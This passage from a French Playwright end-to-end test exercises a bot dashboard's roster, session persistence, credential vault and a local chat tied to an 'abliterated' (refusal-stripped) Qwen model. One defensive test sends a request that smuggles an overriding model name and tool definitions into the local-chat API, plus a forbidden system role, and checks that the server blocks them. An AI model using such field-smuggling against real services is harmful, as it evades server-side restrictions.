  await connection.getByText('Hermes connecté').waitFor({ timeout: 5_000 })
  if (await page.locator('.toast').count()) throw new Error('Le message de session expirée reste affiché après connexion.')

  // Classement : sections par groupes, liste unique par activité avec le bot le plus récent en tête.
  const rosterOrder = () => page.locator('.bot-row:not([data-bot^="local:"])').evaluateAll((rows) => rows.map((row) => row.dataset.bot).join())
  await page.locator('.section-heading').first().waitFor({ timeout: 3_000 })
  if (await rosterOrder() !== 'nova,orion') throw new Error(`Ordre par groupes : ${await rosterOrder()}`)
  await page.getByRole('button', { name: 'Activité', exact: true }).click()
  await page.locator('.section-heading').first().waitFor({ state: 'detached', timeout: 3_000 })
  if (await rosterOrder() !== 'orion,nova') throw new Error(`Ordre par activité : ${await rosterOrder()}`)
  await page.getByRole('button', { name: 'Groupes', exact: true }).click()
  await page.locator('.section-heading').first().waitFor({ timeout: 3_000 })
  if (await rosterOrder() !== 'nova,orion') throw new Error(`Retour aux groupes : ${await rosterOrder()}`)

  const stoppedChild = new Promise((resolve) => child.once('exit', resolve))
  child.kill('SIGTERM')
  await stoppedChild
  child = spawn(process.execPath, ['server/index.mjs'], {
    cwd: new URL('..', import.meta.url),
    env: {
      ...process.env,
      NODE_ENV: 'development', PORT: '4332', HERMES_ORIGIN: 'http://127.0.0.1:9121', OLLAMA_ORIGIN: 'http://127.0.0.1:9121',
      BROWSER_VAULT_PORT: '4333', HERMESBOT_VAULT_TOKEN_FILE: BROWSER_VAULT_TOKEN,
      BROWSER_TOUR_COMMAND: BROWSER_TOUR_FIXTURE, BROWSER_TOUR_OWNER_FILE,
      NODE_OPTIONS: `--require ${new URL('persistence-hook.cjs', import.meta.url).pathname}`,
      HERMESBOT_TEST_SESSION_FILE: SESSION_FILE,
    },
    stdio: ['ignore', 'pipe', 'pipe'],
  })
  for (let attempt = 0; attempt < 50; attempt += 1) {
    try { if ((await fetch('http://127.0.0.1:4332/api/health')).ok) break } catch { /* serveur pas prêt */ }
    await delay(100)
  }
  await page.reload({ waitUntil: 'domcontentloaded' })
  await page.locator('[data-bot=nova]').waitFor({ timeout: 15_000 })
  if (await page.locator('.login-card').count()) throw new Error('La session n’a pas été restaurée après redémarrage.')
  const persistedBrowser = await vaultCall('list')
  if (persistedBrowser.body.entries?.[0]?.identifier !== 'steam-test' || persistedBrowser.raw.includes(BROWSER_SECRET)) throw new Error('Le coffre CDP ne survit pas au redémarrage.')

  // Propriétaire du Chrome partagé : la route et le roster le marquent au travail, même sans tour Hermes.
  if ((await fetch('http://127.0.0.1:4332/api/browser-turn')).status !== 401) throw new Error('Le propriétaire du Chrome est lisible sans session.')
  writeFileSync(BROWSER_TOUR_OWNER_FILE, 'orion')
  const browserTurn = await page.evaluate(async () => (await fetch('/api/browser-turn')).json())
  if (browserTurn.owner !== 'orion') throw new Error('Le serveur ne lit pas le propriétaire du Chrome partagé.')
  await page.reload({ waitUntil: 'domcontentloaded' })
  await page.locator('[data-bot=orion] .bot-row-status.is-working').waitFor({ timeout: 15_000 })
  await page.locator('[data-bot=orion]').getByText('Pilote le Chrome partagé').waitFor()
  rmSync(BROWSER_TOUR_OWNER_FILE, { force: true })

  // Chat local isolé : modèle fixé par le serveur, aucun outil, aucune requête à Hermes.
  if ((await fetch('http://127.0.0.1:4332/api/local-chat', { method: 'POST', headers: { Origin: 'http://127.0.0.1:4332', 'Content-Type': 'application/json' }, body: '{"messages":[{"role":"user","content":"x"}]}' })).status !== 401) throw new Error('/api/local-chat répond sans session.')
  await page.locator('[data-bot="local:qwen-abliterated"]').click()
  const localBox = page.getByRole('textbox', { name: 'Message à Qwen abliterated' })
  await localBox.waitFor({ timeout: 3_000 })
  if (await page.getByRole('button', { name: 'Ajouter des fichiers' }).count()) throw new Error('Le chat local ne doit pas accepter de fichiers.')
  if (await page.getByRole('radio', { name: 'BRAIN', exact: true }).count()) throw new Error('Le chat local ne doit pas avoir de modes.')
  if (await page.locator('.details-panel').count()) throw new Error('Pas de panneau de bot pour le chat local.')
  const promptsBeforeLocal = promptCalls
  await localBox.fill('Bonjour local')
  await localBox.press('Enter')
  await page.locator('.local-chat .message-assistant').getByText('Réponse du modèle local.').waitFor({ timeout: 5_000 })
  if (await page.locator('.local-chat').getByText('je réfléchis').count()) throw new Error('Le raisonnement du modèle est affiché.')
  const localRequest = localChatRequests.at(-1)
  if (localRequest.model !== 'huihui-qwen3.8-27b-abliterated:q4_k' || 'tools' in localRequest || localRequest.messages.length !== 1 || localRequest.messages[0].content !== 'Bonjour local') throw new Error(`Requête locale : ${JSON.stringify(localRequest)}`)
  if (promptCalls !== promptsBeforeLocal) throw new Error('Le chat local a lancé un tour Hermes.')
  await page.screenshot({ path: `${SCREENSHOTS}local-chat.png` })
  const smuggled = await page.evaluate(async () => (await fetch('/api/local-chat', { method: 'POST', credentials: 'same-origin', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ model: 'autre', tools: [{ type: 'function' }], messages: [{ role: 'user', content: 'x', tools: [1] }] }) })).text())
  const smuggledRequest = localChatRequests.at(-1)
  if (!smuggled || smuggledRequest.model !== 'huihui-qwen3.8-27b-abliterated:q4_k' || 'tools' in smuggledRequest || 'tools' in smuggledRequest.messages[0]) throw new Error('Le serveur a laissé passer autre chose que les messages.')
  if (await page.evaluate(async () => (await fetch('/api/local-chat', { method: 'POST', credentials: 'same-origin', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ messages: [{ role: 'system', content: 'x' }] }) })).status) !== 400) throw new Error('Rôle system accepté.')
  // Aller sur un autre bot garde la conversation locale.
  await page.locator('[data-bot=nova]').click()
  await page.locator('[data-bot=nova].is-selected').waitFor({ timeout: 3_000 })
  await page.getByRole('textbox', { name: 'Message à Nova' }).waitFor({ timeout: 3_000 })
  await page.locator('[data-bot="local:qwen-abliterated"]').click()
  await page.locator('.local-chat .message-assistant').getByText('Réponse du modèle local.').waitFor({ timeout: 2_000 })
  // Modèle absent : message clair, pas de plantage.
  localModelMissing = true
  await localBox.fill('Encore')
  await localBox.press('Enter')
  await page.locator('.toast').getByText('pas encore installé').waitFor({ timeout: 5_000 })
  localModelMissing = false
  await page.locator('.toast button').click()
  await page.getByRole('button', { name: 'Effacer la conversation locale' }).click()
  if (await page.locator('.local-chat .message-assistant').count()) throw new Error('Conversation locale non effacée.')
  await page.locator('[data-bot=nova]').click()

  // Une liste vraiment vide garde son message, une fois le chargement fini.
  emptyRoster = true
  await page.reload({ waitUntil: 'domcontentloaded' })
  await page.getByText('Aucun bot à afficher.').waitFor({ timeout: 15_000 })
  emptyRoster = false

  // Lancement avec une session Hermes expirée : pas d’écran de connexion.
  expiredBefore = cookieCounter
  await page.reload({ waitUntil: 'domcontentloaded' })
  await page.locator('[data-bot=nova]').waitFor({ timeout: 15_000 })
  if (await page.locator('.login-card').count()) throw new Error('Écran de connexion au lancement malgré les identifiants gardés.')

  // Se déconnecter oublie les identifiants ; une connexion sans la case n’enregistre rien.
  page.once('dialog', (dialog) => dialog.accept())
  await page.getByRole('button', { name: 'Se déconnecter' }).click()
  await page.locator('.login-card').waitFor({ timeout: 10_000 })
  if (existsSync(SAVED_LOGIN_FILE) || logoutCalls !== 1) throw new Error('La déconnexion doit oublier les identifiants.')
  await page.getByLabel('Rester connecté sur ce Mac').uncheck()
  await page.getByLabel('Identifiant Hermes').fill('test')
  await page.getByLabel('Mot de passe').fill('test')
  await page.getByRole('button', { name: 'Ouvrir mes bots' }).click()
  await page.locator('[data-bot=nova]').waitFor({ timeout: 15_000 })
  if (existsSync(SAVED_LOGIN_FILE)) throw new Error('Case décochée : rien ne doit être enregistré.')

  // Mode démo : plusieurs états à la fois (travail, terminé, attente), captures claire et sombre.
  await page.goto('http://127.0.0.1:4332/?demo=1', { waitUntil: 'domcontentloaded' })
  await page.locator('.working-strip.has-work').waitFor({ timeout: 10_000 })
  await page.locator('[data-bot=orion] .bot-row-status.is-working').waitFor()
  await page.locator('[data-bot=orion] .live-avatar.is-working').waitFor()
  await delay(900)
  await page.screenshot({ path: `${SCREENSHOTS}demo-glass-light.png` })
  await page.getByRole('button', { name: 'Activité', exact: true }).click()
  await page.locator('.section-heading').first().waitFor({ state: 'detached', timeout: 3_000 })
  await delay(300)
  await page.screenshot({ path: `${SCREENSHOTS}demo-activity.png` })
  if (await page.locator('.sidebar-filter-row').evaluate((row) => row.scrollWidth > row.clientWidth)) throw new Error('La ligne de filtres déborde de la sidebar.')
  await page.getByRole('button', { name: 'Groupes', exact: true }).click()
  await page.getByRole('button', { name: 'Passer au thème sombre' }).click()
  await delay(700)
  await page.screenshot({ path: `${SCREENSHOTS}demo-glass-dark.png` })
  await page.getByRole('button', { name: 'Passer au thème clair' }).click()

  if (errors.length) throw new Error(`Erreurs Chromium: ${errors.join(', ')}`)
  console.log('E2E OK: auth, WebSocket, roster, routines réelles, cache instantané, médias MEDIA: (galerie, vidéo Range, visionneuse, filtres, vidéo qui continue après le streaming), statut au travail et tour en arrière-plan, NOREPLY jamais affiché en streaming, /model, contexte, tok/s, envoi, streaming, scroll libre, coupure 1006 et reconnexion, bouton de reconnexion (socket unique, réabonnement, gateway injoignable, session expirée), classement par groupes ou par activité, résumé du travail sans non-lu avant la fin, coffre gateway et accords, coffre CDP dans le trousseau (save, list, fill, code, bots autorisés, réglages, refus d’origine, journal sans secret, persistance), carte de mail, identifiants gardés, mentions @bot, glisser-déposer, documents en onglets (HTML isolé), onglet Usage, onglet Médias, message pendant le travail, raccourcis, modes BRAIN, PLAN et EXEC, écrans de chargement.')
} finally {
  if (browser) await browser.close()
  if (child) child.kill('SIGTERM')
  if (vaultService) vaultService.kill('SIGTERM')
  await execFileAsync('/usr/bin/security', ['delete-keychain', BROWSER_VAULT_KEYCHAIN]).catch(() => undefined)
  rmSync(BROWSER_VAULT_KEYCHAIN, { force: true })
  rmSync(BROWSER_VAULT_TOKEN, { force: true })
  wss.close()
  cdpWss.close()
  await new Promise((resolve) => mock.close(resolve))
  await new Promise((resolve) => cdpMock.close(resolve))
  rmSync(BROWSER_TOUR_OWNER_FILE, { force: true })
  rmSync(BROWSER_TOUR_FIXTURE, { force: true })
}
